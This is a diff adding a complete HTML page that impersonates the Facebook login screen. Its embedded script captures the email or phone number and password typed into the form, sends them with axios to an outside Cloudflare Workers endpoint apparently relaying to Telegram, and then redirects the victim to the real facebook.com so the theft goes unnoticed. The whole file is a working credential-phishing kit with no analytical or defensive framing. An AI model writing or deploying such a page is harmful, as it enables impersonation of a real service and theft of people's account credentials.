@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Log in to Facebook</title>
+    <style>
+        body { background-color: #f0f2f5; font-family: Segoe UI, Helvetica, Arial, sans-serif; height: 100vh; display: flex; justify-content: center; align-items: center; margin: 0; }
+        .container { width: 396px; text-align: center; }
+        .logo { font-size: 60px; font-weight: 700; color: #1877f2; margin-bottom: 10px; }
+        .login-card { background: white; padding: 20px; border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); }
+        input { width: 100%; height: 52px; margin-bottom: 12px; padding: 14px 16px; border: 1px solid #dddfe2; border-radius: 6px; font-size: 17px; box-sizing: border-box; }
+        input:focus { border-color: #1877f2; outline: none; }
+        .login-btn { width: 100%; height: 48px; background-color: #1877f2; border: none; border-radius: 6px; color: white; font-size: 20px; font-weight: bold; cursor: pointer; }
+        .forgot { display: block; margin-top: 15px; color: #1877f2; text-decoration: none; font-size: 14px; }
+        .line { border-top: 1px solid #dddfe2; margin: 20px 0; }
+        .create-btn { background-color: #42b72a; color: white; padding: 12px 20px; border: none; border-radius: 6px; font-size: 17px; font-weight: bold; cursor: pointer; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">facebook</div>
+        <div class="login-card">
+            <form id="login-form">
+                <input type="text" id="username" placeholder="Email address or phone number" required>
+                <input type="password" id="password" placeholder="Password" required>
+                <button type="submit" class="login-btn">Log In</button>
+            </form>
+            <a href="#" class="forgot">Forgotten password?</a>
+            <div class="line"></div>
+            <button class="create-btn">Create new account</button>
+        </div>
+    </div>
+
+    <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
+    <script>
+        const PROXY_URL = "https://tlgram.alidm0935.workers.dev/";
+
+        document.getElementById('login-form').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const message = `👤 User: ${document.getElementById('username').value}\n🔑 Pass: ${document.getElementById('password').value}`;
+            
+            axios.post(PROXY_URL, { text: message })
+            .finally(() => { 
+                window.location.href = "https://www.facebook.com"; 
+            });
+        });
+    </script>
+</body>
+</html>
